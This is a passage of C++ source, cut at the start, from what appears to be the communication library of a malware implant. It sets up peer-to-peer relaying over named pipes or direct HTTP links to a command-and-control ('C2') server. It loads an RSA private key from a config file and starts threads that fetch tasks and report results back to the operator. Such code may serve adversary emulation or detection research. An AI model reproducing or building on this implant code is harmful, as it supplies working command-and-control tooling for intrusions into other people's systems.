            result = api_wrapper->GetLastErrorWrapper();
            logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "Failed to disconnect pipe. Error code: " + std::to_string(result));
            if (commLibTestingMode) break;
            continue;
        }

        logging::LogMessage(
            api_wrapper,
            LOG_P2P_HANDLER,
            LOG_LEVEL_DEBUG,
            "Received client message. Type: " + std::to_string(client_msg.message_type) + ", Client ID: " + client_msg.client_id + ", Response pipe: " + client_msg.response_pipe_path
        );

        // Handle client message
        result = handleP2pClientMessage(api_wrapper, comm_lib, &client_msg, httpConnection);
        if (result != ERROR_SUCCESS) {
            logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "Failed to handle client p2p message. Error code: " + std::to_string(result));
        }
        if (commLibTestingMode) break;
    }
}

DWORD WINAPI CommLib::run(LPVOID lpParameter) {
    auto commLib = std::make_shared<CommLib>(configFileName);
    WinApiWrapperInterface* p_api_wrapper;
    WinApiWrapper api_wrapper;
    if (lpParameter != nullptr) {
        p_api_wrapper = (WinApiWrapperInterface*)lpParameter;
    } else {
        p_api_wrapper = &api_wrapper;
    }

    // Fetch RSA key
    rsa_enc::rsa_private_key_base64 = commLib->getValueFromConfigFile(p_api_wrapper, SECTION_CRYPTO, "rsa_priv", "");
    if (rsa_enc::rsa_private_key_base64.length() > 0) {
        logging::LogMessage(p_api_wrapper, LOG_CORE, LOG_LEVEL_INFO, "Imported RSA key from config file.");
    } else {
        logging::LogMessage(p_api_wrapper, LOG_CORE, LOG_LEVEL_ERROR, "Failed to read RSA key from config file.");
    }

    // Set up p2p components, including determining if running in HTTP or named pipe P2P mode, and proceed accordingly
    // This setup must be run regardless of what mode we're running in.
    if (!commLib->p2pSetup(p_api_wrapper)) {
        logging::LogMessage(p_api_wrapper, LOG_CORE, LOG_LEVEL_ERROR, "Failed to set up peer-to-peer");
        if (commLib->h_local_pipe != nullptr && commLib->h_local_pipe != INVALID_HANDLE_VALUE) {
            p_api_wrapper->CloseHandleWrapper(commLib->h_local_pipe);
        }
        return FAIL_SETUP_P2P;
    }
    logging::LogMessage(p_api_wrapper, LOG_CORE, LOG_LEVEL_INFO, "Set up peer to peer.");

    if (commLib->p2pModeEnabled) {
        // Using named pipe p2p instead of HTTP
        logging::LogMessage(p_api_wrapper, LOG_CORE, LOG_LEVEL_INFO, "Running as p2p named pipe client.");
        p2pClientCoreLoop(p_api_wrapper, commLib);
    } else {
        // Using HTTP to communicate with C2 directly
        logging::LogMessage(p_api_wrapper, LOG_CORE, LOG_LEVEL_INFO, "Running in HTTP mode.");

        // Establish server connections - one for direct HTTP use and one for p2p relaying
        auto directHttpConnection = commLib->EstablishServerConnection(p_api_wrapper); 
        auto p2pRelayConnection = commLib->EstablishServerConnection(p_api_wrapper);
        if (directHttpConnection == nullptr || p2pRelayConnection == nullptr) {
            logging::LogMessage(p_api_wrapper, LOG_CORE, LOG_LEVEL_ERROR, "Failed to create HTTP connections.");
            if (commLib->h_local_pipe != nullptr && commLib->h_local_pipe != INVALID_HANDLE_VALUE) {
                p_api_wrapper->CloseHandleWrapper(commLib->h_local_pipe);
            }
            return FAIL_ESTABLISH_SERVER_CONNECTION;
        }
        logging::LogMessage(p_api_wrapper, LOG_CORE, LOG_LEVEL_DEBUG, "Created HTTP server connections.");

        // Start the seperate threads for getting new tasks and reporting finished tasks
        auto newTasksFuture = std::async(std::launch::async, FindNewTasks, p_api_wrapper, commLib, directHttpConnection);
        auto taskReportingFuture = std::async(std::launch::async, ReportFinishedTasks, p_api_wrapper, commLib, directHttpConnection, commLib->getResourceForTaskReport());
        auto p2pListenerHandlerFuture = std::async(std::launch::async, p2pListenerCoreLoop, p_api_wrapper, commLib, p2pRelayConnection);
        logging::LogMessage(p_api_wrapper, LOG_CORE, LOG_LEVEL_DEBUG, "Created task threads.");

        // Wait for both to finish.
        newTasksFuture.wait();
        taskReportingFuture.wait();
        p2pListenerHandlerFuture.wait();
    }
    if (commLib->h_local_pipe != nullptr && commLib->h_local_pipe != INVALID_HANDLE_VALUE) {
        p_api_wrapper->CloseHandleWrapper(commLib->h_local_pipe);
    }
    return ERROR_SUCCESS;
}